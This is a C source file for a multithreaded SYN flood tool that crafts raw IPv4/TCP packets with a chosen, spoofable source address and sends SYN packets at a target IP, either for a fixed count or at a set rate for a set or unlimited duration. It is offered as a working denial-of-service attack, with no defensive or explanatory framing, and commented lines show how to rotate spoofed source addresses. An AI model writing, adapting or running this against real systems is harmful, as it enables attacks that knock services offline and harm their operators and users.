#include "header.h"

#include "make_ipv4.h"
#include "make_tcp.h"

int tcpsyn_total;
int tcpsyn_produced;
int tcpsyn_received;

int tcpsyn_per_second;
int tcpsyn_duration;
double tcpsyn_elapsed_time;

char *dest_ip;
char *src_ip;

pthread_mutex_t tcpsyn_mutex;
pthread_cond_t tcpsyn_cond;

void syn_flood_print_usage(int mode) {

	if (mode == 1)
		printf(
				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests] \n");
	if (mode == 2)
		printf(
				"SYN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds] [duration (0 for INF)]\n");
}

void* generate_syn_request1(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	while (1) {

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(src_ip));

		/*** If you want to modify ip address*/
		//next_ip_addr(src_ip, 1);
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, tcpsyn_produced);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_produced);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);

		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
		/***For SYN TCP request, ACK seq should not be provided.*/

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		printf("%d\n",((struct iphdr *)packet)->tot_len);


		pthread_mutex_lock(&tcpsyn_mutex);

		if (tcpsyn_produced >= tcpsyn_total) {
			pthread_mutex_unlock(&tcpsyn_mutex);
			pthread_cond_broadcast(&tcpsyn_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
		free(packet);
		tcpsyn_produced++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
}

void* generate_syn_request2(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	while (1) {
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(src_ip));

		//modify src_ip, increment 1.
		//next_ip_addr(src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, tcpsyn_total);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_total);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_total);
		//tcp_h = tcp_set_ack_seq(tcp_h,35623);

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h, 0);

		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));

		pthread_mutex_lock(&tcpsyn_mutex);

		if (tcpsyn_elapsed_time >= tcpsyn_duration) {
			pthread_mutex_unlock(&tcpsyn_mutex);
			pthread_cond_broadcast(&tcpsyn_cond);
			return 0;
		}

		if (tcpsyn_produced == tcpsyn_per_second) {
			pthread_cond_wait(&tcpsyn_cond, &tcpsyn_mutex);
		}

		send_packet(sock, ipv4_h, packet, rand() % 50000 + 1000);
		free(packet);
		tcpsyn_produced++;
		tcpsyn_total++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
}

void* syn_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1, t2;
	t1 = clock();
	clock_t elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&tcpsyn_mutex);
		t2 = clock();
		time_taken = ((double) (t2 - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			tcpsyn_produced = 0;
			t1 = clock();
			time_taken = 0;
			tcpsyn_elapsed_time = ((double) (t1 - elapsed_time))
					/ CLOCKS_PER_SEC;
			pthread_cond_signal(&tcpsyn_cond);
		}
		pthread_mutex_unlock(&tcpsyn_mutex);
	}
}

void syn_flood_run(char *argv[], int mode) {

	src_ip = (char*) malloc(sizeof(char) * 20);

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 4) {
		syn_flood_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 5) {
		syn_flood_print_usage(mode);
		return;
	}

	strcpy(src_ip, argv[0]);

	tcpsyn_mutex = PTHREAD_MUTEX_INITIALIZER;

	tcpsyn_produced = 0;
	if (mode == 1) {
		tcpsyn_total = atoi(argv[3]);
	}

	if (mode == 2) {
		tcpsyn_total = 0;
		tcpsyn_per_second = atoi(argv[3]);
		tcpsyn_duration = atoi(argv[4]);
		if (tcpsyn_duration == 0)
			tcpsyn_duration = (1 << 30);
	}

	int num_threads = atoi(argv[2]);

	dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));
	int i;

	printf("Sending SYN requests to %s using %d threads\n", dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_syn_request1,
					(void*) &generate_thread_id[i]);
		if (mode == 2)
			pthread_create(&generate_thread[i], NULL, generate_syn_request2,
					(void*) &generate_thread_id[i]);
	}

	if (mode == 2) {
		pthread_create(&generate_thread[i], NULL, syn_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	printf("SYN flood finished\n");

	pthread_mutex_destroy(&tcpsyn_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(src_ip);
	return;
}

